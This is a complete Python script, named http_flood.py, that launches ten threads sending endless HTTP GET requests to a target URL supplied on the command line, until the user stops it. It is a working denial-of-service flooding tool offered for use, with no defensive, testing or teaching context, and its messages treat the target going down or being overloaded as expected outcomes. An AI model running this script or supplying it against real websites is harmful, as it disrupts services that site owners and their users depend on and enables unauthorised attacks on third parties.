import sys
import threading
import requests
import time
import signal

stop_event = threading.Event()

def send_requests(target_url):
    count = 0
    while not stop_event.is_set():
        try:
            response = requests.get(target_url, timeout=5)
            count += 1
            print(f"Request #{count}: Response {response.status_code}")
        except requests.exceptions.ConnectionError:
            print("Error: Unable to connect to the target server. It might be down.")
            break
        except requests.exceptions.Timeout:
            print("Error: Request timed out. Target server might be overloaded.")
        except Exception as e:
            print(f"Unexpected error: {e}")

if len(sys.argv) != 2:
    print("Usage: python3 http_flood.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1]

def signal_handler(sig, frame):
    print("Stopping threads...")
    stop_event.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

threads = []
for _ in range(10):  # 10 threads
    t = threading.Thread(target=send_requests, args=(target_url,))
    t.start()
    threads.append(t)

while not stop_event.is_set():
    time.sleep(1)